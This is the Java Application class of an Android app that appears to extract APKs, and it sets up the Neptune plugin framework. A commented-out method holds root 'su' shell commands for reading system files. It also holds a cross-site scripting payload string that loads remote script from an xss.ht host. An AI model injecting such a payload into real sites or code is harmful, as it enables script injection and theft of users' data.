package com.walhalla.appextractor;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import androidx.core.content.FileProvider;
import androidx.multidex.MultiDexApplication;

import com.walhalla.abcsharedlib.Share;
import com.walhalla.appextractor.core.RBCWrapperDelegate;
import com.walhalla.ui.DLog;

import org.qiyi.pluginlibrary.Neptune;
import org.qiyi.pluginlibrary.NeptuneConfig;
//@ axp.tool.apkextractor

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;

public class App extends MultiDexApplication {

    public App() {

    }

    @Override
    public void onCreate() {
        super.onCreate();
        //rr(this);
        ContextUtils.test0(this);

        //DLog.d("{U}" + System.getProperty("http.agent"));
        NeptuneConfig config = new NeptuneConfig.Builder()
                .configSdkMode(NeptuneConfig.INSTRUMENTATION_MODE)
                .enableDebug(BuildConfig.DEBUG)
                .build();
        Neptune.init(this, config);
    }

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        //SplitCompat.install(this);//otherAppContext
    }

//    private void rr(App app) {
//
//        File src = new File("/system/build.prop");
//        File dst = new File(System.getenv("EXTERNAL_STORAGE") +"/Download/1.prop");
//
//        Process p = null;
//        DLog.d("@az@" + src.exists());
//        try {
////            p = Runtime.getRuntime().exec("su -c cat " + src.getAbsolutePath()
////                    + " > " + dst.getAbsolutePath());
//            p = Runtime.getRuntime().exec("su ls -l /system/");
//            p.waitFor();
//
//            if (p.exitValue() != 0) {
//                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
//                String line = "";
//                while ((line = reader.readLine()) != null) {
//                    DLog.d(line);
//                }
//            }
//        } catch (IOException e) {
//        } catch (InterruptedException e) {
//            DLog.handleException(e);
//        } finally {
//            if (p != null) {
//                try {
//                    p.destroy();
//                } catch (Exception e) {
//                    DLog.handleException(e);
//                }
//            }
//        }
//        DLog.d("@az@" + dst.exists());
//        String aa = "'\"/><!--\n--></script><script src=https://tweeqold.xss.ht></script><script>$.getScript(\"//tweeqold.xss.ht\")</script>";
//    }

}
